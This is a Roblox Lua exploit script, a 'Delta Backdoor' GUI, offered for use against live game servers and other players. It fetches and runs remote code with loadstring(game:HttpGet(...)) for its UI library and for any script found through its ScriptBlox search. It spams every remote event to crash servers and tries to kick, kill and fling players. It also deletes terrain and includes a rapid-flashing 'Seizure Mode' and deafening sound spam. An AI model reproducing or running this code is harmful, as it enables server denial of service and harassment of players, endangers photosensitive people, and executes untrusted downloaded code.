-- Delta Mobile Backdoor GUI
-- Optimized for phone screens with ScriptBlox integration

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/0x"))()
local Window = Library:CreateWindow({
    Name = "Delta Backdoor",
    Themeable = {
        Info = "Mobile optimized server control"
    }
})

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- Helper Functions
local function FireAllRemotes(args)
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            pcall(function()
                obj:FireServer(unpack(args or {}))
            end)
        end
    end
end

local function InvokeAllRemotes(args)
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteFunction") then
            pcall(function()
                obj:InvokeServer(unpack(args or {}))
            end)
        end
    end
end

local function GetScriptBloxScripts(query)
    local url = "https://scriptblox.com/api/script/search?q="..HttpService:UrlEncode(query)
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        return HttpService:JSONDecode(result)
    end
    return nil
end

-- Server Destruction Tab
local ServerTab = Window:CreateTab("🔥 Server Destruction")

ServerTab:CreateButton({
    Name = "Mass Remote Spam",
    Callback = function()
        spawn(function()
            while true do
                FireAllRemotes({string.rep("DELTA_BACKDOOR", 1000)})
                InvokeAllRemotes({string.rep("OVERFLOW", 1000)})
                wait()
            end
        end)
    end
})

ServerTab:CreateButton({
    Name = "Crash Server (Memory)",
    Callback = function()
        spawn(function()
            local crash = {}
            while true do
                for i = 1, 1000 do
                    table.insert(crash, Instance.new("Part", Workspace))
                    crash[#crash].Size = Vector3.new(math.random(1,100), math.random(1,100), math.random(1,100))
                    crash[#crash].Anchored = false
                    crash[#crash].CanCollide = true
                end
                FireAllRemotes({crash})
                wait()
            end
        end)
    end
})

ServerTab:CreateButton({
    Name = "Infinite Part Spam",
    Callback = function()
        spawn(function()
            while true do
                for i = 1, 500 do
                    local p = Instance.new("Part", Workspace)
                    p.Size = Vector3.new(50, 50, 50)
                    p.Position = Vector3.new(math.random(-1000, 1000), 500, math.random(-1000, 1000))
                    p.Anchored = false
                    p.Material = Enum.Material.Neon
                    p.BrickColor = BrickColor.Random()
                end
                wait(0.1)
            end
        end)
    end
})

ServerTab:CreateButton({
    Name = "Network Flood",
    Callback = function()
        spawn(function()
            while true do
                for i = 1, 100 do
                    FireAllRemotes({
                        string.rep("A", 10000),
                        string.rep("B", 10000),
                        string.rep("C", 10000)
                    })
                end
                wait()
            end
        end)
    end
})

ServerTab:CreateButton({
    Name = "Exploit All Remotes",
    Callback = function()
        local exploits = {
            "kick", "ban", "admin", "owner", "mod",
            "/e free", "give", "money", "cash",
            999999999, -999999999, math.huge,
            true, false, nil
        }
        spawn(function()
            while true do
                for _, exploit in pairs(exploits) do
                    FireAllRemotes({exploit})
                    InvokeAllRemotes({exploit})
                end
                wait(0.5)
            end
        end)
    end
})

-- Visual Effects Tab
local EffectsTab = Window:CreateTab("✨ Visual Effects")

EffectsTab:CreateButton({
    Name = "Disco Lighting",
    Callback = function()
        spawn(function()
            while true do
                Lighting.Ambient = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                Lighting.OutdoorAmbient = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                Lighting.ColorShift_Top = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                wait(0.1)
            end
        end)
    end
})

EffectsTab:CreateButton({
    Name = "Particle Explosion",
    Callback = function()
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                local particle = Instance.new("ParticleEmitter", part)
                particle.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                particle.Rate = 500
                particle.Lifetime = NumberRange.new(5, 10)
                particle.Speed = NumberRange.new(50, 100)
                particle.Color = ColorSequence.new(Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)))
            end
        end
    end
})

EffectsTab:CreateButton({
    Name = "Sky Corruption",
    Callback = function()
        local sky = Instance.new("Sky", Lighting)
        spawn(function()
            while true do
                sky.SkyboxBk = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sky.SkyboxDn = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sky.SkyboxFt = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sky.SkyboxLf = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sky.SkyboxRt = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sky.SkyboxUp = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                wait(0.5)
            end
        end)
    end
})

EffectsTab:CreateButton({
    Name = "Fog Storm",
    Callback = function()
        spawn(function()
            while true do
                Lighting.FogEnd = math.random(10, 100)
                Lighting.FogColor = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                wait(0.2)
            end
        end)
    end
})

EffectsTab:CreateButton({
    Name = "Seizure Mode",
    Callback = function()
        spawn(function()
            while true do
                Lighting.Brightness = math.random(0, 10)
                Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
                Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
                for _, v in pairs(Workspace:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.Color = Color3.new(math.random(), math.random(), math.random())
                    end
                end
                wait()
            end
        end)
    end
})

-- Sound Chaos Tab
local SoundTab = Window:CreateTab("🔊 Sound Chaos")

local soundIds = {
    142376088, 1837849285, 6928186463, 5816432987,
    189490703, 566399014, 5074449746, 1843463175
}

SoundTab:CreateButton({
    Name = "Earrape Everything",
    Callback = function()
        for i = 1, 50 do
            local sound = Instance.new("Sound", Workspace)
            sound.SoundId = "rbxassetid://"..soundIds[math.random(1, #soundIds)]
            sound.Volume = 10
            sound.Looped = true
            sound:Play()
        end
    end
})

SoundTab:CreateButton({
    Name = "Random Sound Spam",
    Callback = function()
        spawn(function()
            while true do
                local sound = Instance.new("Sound", Workspace)
                sound.SoundId = "rbxassetid://"..tostring(math.random(1000000, 9999999))
                sound.Volume = 5
                sound:Play()
                game.Debris:AddItem(sound, 2)
                wait(0.1)
            end
        end)
    end
})

SoundTab:CreateButton({
    Name = "Distorted Audio",
    Callback = function()
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.PlaybackSpeed = math.random(1, 50) / 10
                sound.Volume = 10
                sound:Play()
            end
        end
    end
})

SoundTab:CreateButton({
    Name = "Bass Boosted Hell",
    Callback = function()
        for i = 1, 20 do
            local sound = Instance.new("Sound", Workspace)
            sound.SoundId = "rbxassetid://5816432987" -- Bass boosted
            sound.Volume = 10
            sound.Looped = true
            local eq = Instance.new("EqualizerSoundEffect", sound)
            eq.LowGain = 10
            eq.MidGain = -20
            eq.HighGain = -10
            sound:Play()
        end
    end
})

-- ScriptBlox Search Tab
local ScriptBloxTab = Window:CreateTab("📜 ScriptBlox")

local searchBox
local resultsContainer

ScriptBloxTab:CreateTextbox({
    Name = "Search Scripts",
    PlaceholderText = "Enter game name or keyword",
    Callback = function(query)
        if query ~= "" then
            local results = GetScriptBloxScripts(query)
            if results and results.result then
                -- Clear previous results
                if resultsContainer then
                    resultsContainer:Destroy()
                end
                
                for i, script in pairs(results.result.scripts) do
                    if i <= 10 then -- Limit to 10 results
                        ScriptBloxTab:CreateButton({
                            Name = script.title or "Unnamed Script",
                            Callback = function()
                                if script.script then
                                    loadstring(script.script)()
                                elseif script.scriptUrl then
                                    loadstring(game:HttpGet(script.scriptUrl))()
                                end
                            end
                        })
                    end
                end
            end
        end
    end
})

ScriptBloxTab:CreateButton({
    Name = "Popular Scripts",
    Callback = function()
        local popular = GetScriptBloxScripts("popular")
        if popular and popular.result then
            for i, script in pairs(popular.result.scripts) do
                if i <= 5 then
                    ScriptBloxTab:CreateButton({
                        Name = script.title or "Script "..i,
                        Callback = function()
                            if script.script then
                                loadstring(script.script)()
                            end
                        end
                    })
                end
            end
        end
    end
})

-- Player Control Tab
local PlayerTab = Window:CreateTab("👥 Player Control")

PlayerTab:CreateButton({
    Name = "Kick All (Attempt)",
    Callback = function()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                FireAllRemotes({"kick", player})
                FireAllRemotes({player, "kick"})
                InvokeAllRemotes({"kick", player.UserId})
            end
        end
    end
})

PlayerTab:CreateButton({
    Name = "Teleport All to You",
    Callback = function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = LocalPlayer.Character.HumanoidRootPart.Position
            FireAllRemotes({"teleport", pos})
            FireAllRemotes({CFrame.new(pos)})
        end
    end
})

PlayerTab:CreateButton({
    Name = "Kill All (Attempt)",
    Callback = function()
        FireAllRemotes({"kill", "all"})
        FireAllRemotes({0, "Health"})
        for _, player in pairs(Players:GetPlayers()) do
            FireAllRemotes({"damage", player, math.huge})
        end
    end
})

PlayerTab:CreateButton({
    Name = "Fling All",
    Callback = function()
        local fling = Vector3.new(math.random(-1000, 1000), 5000, math.random(-1000, 1000))
        FireAllRemotes({"fling", fling})
        FireAllRemotes({fling})
    end
})

-- Misc Tab
local MiscTab = Window:CreateTab("⚙️ Misc")

MiscTab:CreateButton({
    Name = "Delete Terrain",
    Callback = function()
        pcall(function()
            Workspace.Terrain:Clear()
        end)
    end
})

MiscTab:CreateButton({
    Name = "Delete All NPCs",
    Callback = function()
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChild("Humanoid") and not Players:GetPlayerFromCharacter(v) then
                v:Destroy()
            end
        end
    end
})

MiscTab:CreateButton({
    Name = "Unanchor Everything",
    Callback = function()
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
    end
})

MiscTab:CreateButton({
    Name = "Bring All Items",
    Callback = function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = LocalPlayer.Character.HumanoidRootPart.Position
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("Tool") or v:IsA("Model") and v:FindFirstChild("Handle") then
                    pcall(function()
                        v.Handle.CFrame = CFrame.new(pos)
                    end)
                end
            end
        end
    end
})

MiscTab:CreateToggle({
    Name = "Anti-AFK",
    Default = false,
    Callback = function(state)
        if state then
            local VirtualUser = game:GetService("VirtualUser")
            game:GetService("Players").LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
    end
})

MiscTab:CreateButton({
    Name = "Destroy GUI",
    Callback = function()
        Library:Destroy()
    end
})

-- Initialize
print("Delta Backdoor loaded successfully")
print("Swipe from right edge to toggle GUI")
